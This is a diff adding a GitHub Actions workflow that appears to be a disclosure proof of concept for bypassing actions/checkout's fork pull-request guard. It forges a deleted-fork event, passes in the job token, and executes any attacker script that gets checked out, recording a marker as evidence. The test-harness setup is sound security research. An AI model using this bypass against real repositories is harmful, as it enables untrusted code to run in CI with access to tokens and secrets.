@@ -1,0 +1,94 @@
+name: checkout-v7-deleted-fork-rce-poc
+
+on:
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  prove-rce-consequence:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Fetch released actions/checkout v7.0.1 source
+        uses: actions/checkout@v7
+        with:
+          repository: actions/checkout
+          ref: v7.0.1
+          path: checkout-v7
+          persist-credentials: false
+
+      - name: Bypass guard under deleted-fork metadata and execute controlled marker
+        shell: bash
+        env:
+          PROJECT_TOKEN: ${{ github.token }}
+          FAKE_REPO_SECRET: GHBB_FAKE_REPOSITORY_SECRET_6d84a1
+        run: |
+          set -euo pipefail
+          mkdir -p "$RUNNER_TEMP/fake-workspace" "$RUNNER_TEMP/evidence"
+          cat > "$RUNNER_TEMP/deleted-fork-controlled-event.json" <<'JSON'
+          {
+            "repository": {
+              "id": 900807132,
+              "name": "Project",
+              "full_name": "pratik90908/Project",
+              "owner": {"login": "pratik90908"},
+              "private": false,
+              "default_branch": "main"
+            },
+            "pull_request": {
+              "number": 999999,
+              "head": {
+                "sha": "8c3d3492f6f3f5cd0defbcee2b20393ab50b2738",
+                "ref": "deleted-fork-attacker-content",
+                "repo": null
+              },
+              "base": {
+                "ref": "main",
+                "repo": {"id": 900807132, "full_name": "pratik90908/Project"}
+              },
+              "merge_commit_sha": null
+            }
+          }
+          JSON
+
+          set +e
+          env \
+            GITHUB_EVENT_NAME='pull_request_target' \
+            GITHUB_EVENT_PATH="$RUNNER_TEMP/deleted-fork-controlled-event.json" \
+            GITHUB_REPOSITORY='pratik90908/Project' \
+            GITHUB_REPOSITORY_OWNER='pratik90908' \
+            GITHUB_WORKSPACE="$RUNNER_TEMP/fake-workspace" \
+            'INPUT_REPOSITORY=pratik90908/Project' \
+            'INPUT_REF=8c3d3492f6f3f5cd0defbcee2b20393ab50b2738' \
+            'INPUT_PATH=attacker-tree' \
+            'INPUT_FETCH-DEPTH=1' \
+            'INPUT_PERSIST-CREDENTIALS=false' \
+            "INPUT_TOKEN=$PROJECT_TOKEN" \
+            node checkout-v7/dist/index.js > "$RUNNER_TEMP/checkout-rce.log" 2>&1
+          checkout_rc=$?
+          set -e
+
+          OUT="$RUNNER_TEMP/evidence/result.txt"
+          printf 'CHECKOUT_EXIT=%s\n' "$checkout_rc" > "$OUT"
+          if grep -q 'Refusing to check out fork pull request code' "$RUNNER_TEMP/checkout-rce.log"; then
+            printf 'GUARD_REFUSED=yes\n' >> "$OUT"
+          else
+            printf 'GUARD_REFUSED=no\n' >> "$OUT"
+          fi
+          if test -f "$RUNNER_TEMP/fake-workspace/attacker-tree/deleted-fork-poc.sh"; then
+            printf 'ATTACKER_SCRIPT_MATERIALIZED=yes\n' >> "$OUT"
+            RUNNER_TEMP="$RUNNER_TEMP" FAKE_REPO_SECRET="$FAKE_REPO_SECRET" \
+              bash "$RUNNER_TEMP/fake-workspace/attacker-tree/deleted-fork-poc.sh"
+            cat "$RUNNER_TEMP/deleted-fork-exec-marker.txt" >> "$OUT"
+          else
+            printf 'ATTACKER_SCRIPT_MATERIALIZED=no\n' >> "$OUT"
+          fi
+          cat "$OUT"
+
+      - name: Upload evidence
+        uses: actions/upload-artifact@v7
+        with:
+          name: checkout-v7-deleted-fork-rce-evidence
+          path: ${{ runner.temp }}/evidence/result.txt
